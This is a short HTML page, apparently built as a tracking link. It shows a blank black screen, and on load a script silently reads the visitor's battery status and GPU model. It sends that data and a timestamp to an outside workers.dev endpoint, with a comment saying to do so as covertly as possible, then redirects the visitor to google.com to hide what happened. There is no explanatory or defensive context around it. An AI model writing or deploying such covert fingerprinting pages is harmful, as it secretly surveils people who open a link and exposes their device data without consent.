<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
<body style="background:#000;">
<script>
async function xray() {
    let info = { batt: "N/A", gpu: "N/A" };
    try {
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            info.batt = `${Math.round(b.level * 100)}% [${b.charging ? '⚡' : '🔋'}]`;
        }
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            info.gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "WebGL_On";
        }
    } catch (e) {}

    const t = encodeURIComponent(new Date().toLocaleString('ru-RU'));
    const d = encodeURIComponent(JSON.stringify(info));
    const workerUrl = `https://adminfdm.alexgranny1708.workers.dev/?t=${t}&d=${d}&_=${Date.now()}`;

    // Отправляем данные максимально скрытно
    if (navigator.sendBeacon) {
        navigator.sendBeacon(workerUrl);
        setTimeout(() => window.location.replace("https://google.com"), 500);
    } else {
        fetch(workerUrl, { mode: 'no-cors', keepalive: true });
        setTimeout(() => window.location.replace("https://google.com"), 800);
    }
}
xray();
</script>
</body>
</html>
